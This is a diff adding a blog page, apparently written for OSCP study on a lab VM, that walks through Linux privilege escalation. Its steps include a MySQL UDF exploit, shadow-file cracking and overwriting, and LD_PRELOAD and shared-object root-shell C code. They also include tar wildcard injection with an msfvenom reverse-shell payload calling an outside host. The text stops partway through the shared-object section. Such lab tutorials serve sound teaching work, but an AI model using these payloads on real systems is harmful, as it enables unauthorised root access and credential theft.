@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Linux Privilege Escalation Guide - gr4n173</title><meta name="Description" content="Here I will explain about ways to escalate to root user."><meta property="og:title" content="Linux Privilege Escalation Guide" />
+<meta property="og:description" content="Here I will explain about ways to escalate to root user." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.com/linuxprivsec/" />
+<meta property="og:image" content="http://example.com/linuxprivsec/featured-image.png"/>
+<meta property="article:published_time" content="2021-05-02T17:55:28+08:00" />
+<meta property="article:modified_time" content="2021-05-03T17:55:28+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.com/linuxprivsec/featured-image.png"/>
+<meta name="twitter:title" content="Linux Privilege Escalation Guide"/>
+<meta name="twitter:description" content="Here I will explain about ways to escalate to root user."/>
+<meta name="application-name" content="gr4n173">
+<meta name="apple-mobile-web-app-title" content="gr4n173"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.com/linuxprivsec/" /><link rel="prev" href="http://example.com/moee-1/" /><link rel="next" href="http://example.com/windowsprivsec/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Linux Privilege Escalation Guide",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.com\/linuxprivsec\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "http:\/\/example.com\/linuxprivsec\/featured-image.png",
+                            "width":  389 ,
+                            "height":  159 
+                        }],"genre": "posts","keywords": "linux","wordcount":  1644 ,
+        "url": "http:\/\/example.com\/linuxprivsec\/","datePublished": "2021-05-02T17:55:28+08:00","dateModified": "2021-05-03T17:55:28+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/example.com\/images\/profile.jpg",
+                    "width":  400 ,
+                    "height":  400 
+                }},"author": {
+                "@type": "Person",
+                "name": "gr4n173"
+            },"description": "Here I will explain about ways to escalate to root user."
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="gr4n173"><span class="header-title-pre"><i class='far fa-grin-tongue-wink'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/categories/moee/"> Project </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/gr4n173" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="Select Language">English<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/linuxprivsec/" selected>English</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="gr4n173"><span class="header-title-pre"><i class='far fa-grin-tongue-wink'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/categories/moee/" title="">Project</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/gr4n173" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="Select Language">English<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/linuxprivsec/" selected>English</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Linux Privilege Escalation Guide</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/gr4n173" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>gr4n173</a></span>&nbsp;<span class="post-category">included in <a href="/categories/oscp/"><i class="far fa-folder fa-fw"></i>OSCP Prepration</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-05-02">2021-05-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1644 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;8 minutes&nbsp;<span id="/linuxprivsec/" class="leancloud_visitors" data-flag-title="Linux Privilege Escalation Guide">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+                    </span>&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/linuxprivsec/featured-image.png"
+        data-srcset="/linuxprivsec/featured-image.png, /linuxprivsec/featured-image.png 1.5x, /linuxprivsec/featured-image.png 2x"
+        data-sizes="auto"
+        alt="/linuxprivsec/featured-image.png"
+        title="Here I will explain about ways to escalate to root user." /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-service-exploits">1. Service Exploits</a>
+      <ul>
+        <li><a href="#mysql">mysql</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-week-file-permission">2. Week file permission</a>
+      <ul>
+        <li><a href="#readable">Readable</a></li>
+        <li><a href="#writable">Writable</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#writable-1">Writable</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-shell-escape-sequences">3. Shell Escape Sequences</a></li>
+    <li><a href="#4-sudo-environment-variables">4. Sudo Environment Variables</a></li>
+    <li><a href="#5-cron-jobs">5. Cron Jobs</a>
+      <ul>
+        <li><a href="#environment-variable">Environment Variable</a></li>
+        <li><a href="#wildcards">Wildcards</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-suidsgid-executables">5. SUID/SGID Executables</a>
+      <ul>
+        <li><a href="#known-exploits">Known Exploits</a></li>
+        <li><a href="#shared-object-injection">Shared Object Injection</a></li>
+        <li><a href="#environment-variables">Environment Variables</a></li>
+      </ul>
+    </li>
+    <li><a href="#6-nfs">6. NFS</a></li>
+    <li><a href="#7-passwordkeys">7. Password&amp;Keys</a>
+      <ul>
+        <li><a href="#config-files">config Files</a></li>
+        <li><a href="#history-files">History Files</a></li>
+        <li><a href="#ssh-keys">SSH Keys</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Lets talk about the ways to linux privilege escalate from non-user by exploit executables.</p>
+<p>Links:
+<a href="https://medium.com/malware-buddy/security-infographics-9c4d3bd891ef#18dd">https://medium.com/malware-buddy/security-infographics-9c4d3bd891ef#18dd</a>
+<a href="https://github.com/sagishahar/lpeworkshop">https://github.com/sagishahar/lpeworkshop</a></p>
+<h2 id="1-service-exploits">1. Service Exploits</h2>
+<h3 id="mysql">mysql</h3>
+<p>Using the exploit from exploit db to get the rootshell. Since mysql is run by root without password where we can create the tables and run the <code>command</code> using function.
+The MySQL service is running as root and the &ldquo;root&rdquo; user for the service does not have a password assigned. We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.</p>
+<p>Change into the /home/user/tools/mysql-udf directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ <span class="nb">cd</span> /home/user/tools/mysql-udf
+</code></pre></td></tr></table>
+</div>
+</div><p>Compile the <code>raptor_udf2.c</code> exploit code using the following commands:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ gcc -g -c raptor_udf2.c -fPIC
+root@gr4n173:~$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+</code></pre></td></tr></table>
+</div>
+</div><p>Connect to the MySQL service as the root user with a blank password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ mysql -u root
+</code></pre></td></tr></table>
+</div>
+</div><p>Execute the following commands on the MySQL shell to create a User Defined Function (UDF) <code>&quot;do_system&quot;</code> using our compiled exploit:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; use mysql<span class="p">;</span>
+mysql&gt; create table foo<span class="o">(</span>line blob<span class="o">)</span><span class="p">;</span>
+mysql&gt; insert into foo values<span class="o">(</span>load_file<span class="o">(</span><span class="s1">&#39;/home/user/tools/mysql-udf/raptor_udf2.so&#39;</span><span class="o">))</span><span class="p">;</span>
+mysql&gt; <span class="k">select</span> * from foo into dumpfile <span class="s1">&#39;/usr/lib/mysql/plugin/raptor_udf2.so&#39;</span><span class="p">;</span>
+mysql&gt; create <span class="k">function</span> do_system returns integer soname <span class="s1">&#39;raptor_udf2.so&#39;</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">mysql&gt; select do_system(&#39;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#39;);
+</code></pre></td></tr></table>
+</div>
+</div><p>Exit out of the MySQL shell (type <code>exit</code> or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ /tmp/rootbash -p
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="2-week-file-permission">2. Week file permission</h2>
+<h3 id="readable">Readable</h3>
+<p>#/etc/shadow
+Here I will be exploiting the shadow file which have read permission.
+At first I have check the permission of <code>shadow</code> file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ ls -al /etc/shadow
+-rw-r--rw- <span class="m">1</span> root shadow <span class="m">845</span> May  <span class="m">2</span> 03:41 /etc/shadow
+</code></pre></td></tr></table>
+</div>
+</div><p>There you can see the <code>rw</code> permission to others. So I have read the shadow file and collected the hash of root user.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ cat /etc/shadow          
+root:Hashesh over here :0:99999:7:::                                     
+daemon:*:17298:0:99999:7:::                                                     
+bin:*:17298:0:99999:7::: 
+sys:*:17298:0:99999:7:::
+sync:*:17298:0:99999:7:::
+games:*:17298:0:99999:7:::
+man:*:17298:0:99999:7:::  
+</code></pre></td></tr></table>
+</div>
+</div><p>Now after collecting <code>hash</code> I have used <code>john</code> to crack the hash using <code>rockyou</code> password wordlist.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ john --wordlists<span class="o">=</span>/usr/share/rockyou.txt <span class="nb">hash</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="writable">Writable</h3>
+<h1 id="etcshadow">/etc/shadow</h1>
+<p>For the week file permission I have created the new hash of newpassword using <code>mkpasswd</code> tool in kali linux.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-zsh" data-lang="zsh">root@gr4n173:~$ mkpasswd -m sha-512 passwordhere
+<span class="nv">$6$gdvluNMatnPMjy7r$1</span>oYL8zHY7vcNAQM1QLtoVN8V6cwKIbmXuWoft3fjwS4hPy.ZOOENIs66T6M7IitJeH9U6x3MKi8lJJp7FDifI.
+</code></pre></td></tr></table>
+</div>
+</div><p>Now generated password can be replaced with the hash of <code>root</code> user and then we can login using the same password as a root.</p>
+<h3 id="writable-1">Writable</h3>
+<p>#/etc/passwd
+For this we can create the new hash of newpassword using <code>openssl</code> tool</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ openssl passwd newpassword
+Warning: truncating password to <span class="m">8</span> characters 
+xuMbZmFpJEH/s                                
+</code></pre></td></tr></table>
+</div>
+</div><p>Then pasting this hash in <code>/etc/passwd</code> file and place the generated password hash between the first and second colon (:) of the root user&rsquo;s row (replacing the &ldquo;x&rdquo;).</p>
+<h2 id="3-shell-escape-sequences">3. Shell Escape Sequences</h2>
+<p>#Sudo
+Basically we encounter many program which is run by root user so for that we can use the <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreffer">GTFOBins</a>.</p>
+<p>Using instructions in GTFOBins we can get the root shell. From here I got the list of program which can be used the shell escape sequences but <code>apache2</code> can&rsquo;t be shell escape so for that we can use the environment variable things.</p>
+<h2 id="4-sudo-environment-variables">4. Sudo Environment Variables</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="err">$</span><span class="n">code</span> <span class="k">for</span> <span class="n">preload</span> <span class="n">environment</span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">void</span> <span class="n">_init</span><span class="p">()</span> <span class="p">{</span>
+        <span class="n">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
+        <span class="n">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/bash -p&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Sudo can be configured to inherit certain environment variables from the user&rsquo;s environment.
+Check which environment variables are inherited (look for the env_keep options): <code>sudo -l</code>
+<code>LD\_PRELOAD and LD\_LIBRARY\_PATH</code> are both inherited from the user&rsquo;s environment. <code>LD\_PRELOAD</code> loads a shared object before any others when a program is run. <code>LD\_LIBRARY\_PATH</code> provides a list of directories where shared libraries are searched for first.</p>
+<p>Create a shared object using the code located at /home/user/tools/sudo/preload.c:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+</code></pre></td></tr></table>
+</div>
+</div><p>Run one of the programs you are allowed to run via sudo (listed when running <strong>sudo -l</strong>), while setting the LD_PRELOAD environment variable to the full path of the new shared object:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ sudo <span class="nv">LD_PRELOAD</span><span class="o">=</span>/tmp/preload.so program-name-here
+</code></pre></td></tr></table>
+</div>
+</div><p>A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.</p>
+<p>Run <code>ldd</code> against the apache2 program file to see which shared libraries are used by the program:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ ldd /usr/sbin/apache2
+</code></pre></td></tr></table>
+</div>
+</div><p>Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="err">$</span><span class="n">Code</span> <span class="k">for</span> <span class="n">library</span> <span class="n">path</span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="k">static</span> <span class="kt">void</span> <span class="n">hijack</span><span class="p">()</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">));</span>
+
+<span class="kt">void</span> <span class="nf">hijack</span><span class="p">()</span> <span class="p">{</span>
+        <span class="n">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_LIBRARY_PATH&#34;</span><span class="p">);</span>
+        <span class="n">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/bash -p&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+</code></pre></td></tr></table>
+</div>
+</div><p>Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ sudo <span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>/tmp apache2
+</code></pre></td></tr></table>
+</div>
+</div><p>A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again.</p>
+<h2 id="5-cron-jobs">5. Cron Jobs</h2>
+<h3 id="environment-variable">Environment Variable</h3>
+<p>view the contents of the system-wide crontab: <code>cat /etc/crontab</code></p>
+<p>Note: the PATH variable starts with <code>/home/users</code> which is our user&rsquo;s home directory</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">PATH</span><span class="o">=</span>/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
+</span><span class="cp"></span>
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+</code></pre></td></tr></table>
+</div>
+</div><p>Now giving the permission to <code>overwrite.sh</code> file as <code>+x</code> so that crontab run everytime.</p>
+<h3 id="wildcards">Wildcards</h3>
+<p>If any command is run with a wildcard(*) in home directory then we can use wildcard bypass technique in cron job. For that we have to generate the reverse_shell and then used shell to break out from restricted environments by spawing an interactive system shell.
+<code>generate the shell</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ msfvenom -p linux/x64/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.175 -f elf -o shell.elf
+</code></pre></td></tr></table>
+</div>
+</div><p>Now we have to copy this file to the remote/vulnerable machine that can be done using <code>scp</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ scp /home/localuser/filename remoteuser@ipaddress:/home/user/
+</code></pre></td></tr></table>
+</div>
+</div><p>After shell.elf is downloaded to vulnerable box then set the permission over there.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ chmod +x /home/user/shell.elf
+</code></pre></td></tr></table>
+</div>
+</div><p>Create these two files in /home/user:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ touch /home/user/--checkpoint<span class="o">=</span><span class="m">1</span>  
+root@gr4n173:~$ touch /home/user/--checkpoint-action<span class="o">=</span><span class="nv">exec</span><span class="o">=</span>shell.elf
+</code></pre></td></tr></table>
+</div>
+</div><p>When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.</p>
+<p>Now final part is to set the listner in local machine then you can get the shell after certain minute.</p>
+<h2 id="5-suidsgid-executables">5. SUID/SGID Executables</h2>
+<h3 id="known-exploits">Known Exploits</h3>
+<p>Inorder to find all the SUID/SGID executables on debian we can run</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ find / -perm -u<span class="o">=</span>s -type f 2&gt; /dev/null
+</code></pre></td></tr></table>
+</div>
+</div><p>Then after this we can search the exploit related to the version of executables then get the root shell.</p>
+<h3 id="shared-object-injection">Shared Object Injection</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="err">$</span> <span class="n">shared</span> <span class="n">object</span> <span class="n">injection</span> <span class="n">C</span> <span class="n">code</span>
+<span class="n">libcalc</span><span class="p">.</span><span class="n">c</span> 
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="k">static</span> <span class="kt">void</span> <span class="n">inject</span><span class="p">()</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">));</span>
+
+<span class="kt">void</span> <span class="nf">inject</span><span class="p">()</span> <span class="p">{</span>
+        <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/bash -p&#34;</span><span class="p">);</span>
+<span class="p">}</span>
